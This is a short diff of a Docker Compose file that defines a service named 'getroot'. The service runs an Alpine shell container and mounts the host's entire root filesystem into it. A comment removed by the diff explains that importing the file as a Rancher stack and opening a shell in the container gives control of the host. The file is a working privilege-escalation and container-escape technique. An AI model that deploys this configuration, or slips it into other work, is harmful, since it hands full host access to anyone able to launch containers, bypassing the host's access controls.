@@ -1,9 +1,7 @@
-myapp:
+getroot:
   image: alpine:latest
   stdin_open: true
   tty: true
   entrypoint: /bin/sh
   volumes:
     - /:/root
-  
-#Import this docker compose file using the add stack option of Rancher.  Once running navigate to the node and then Execute Shell from the menu, you now own the host this container runs on.
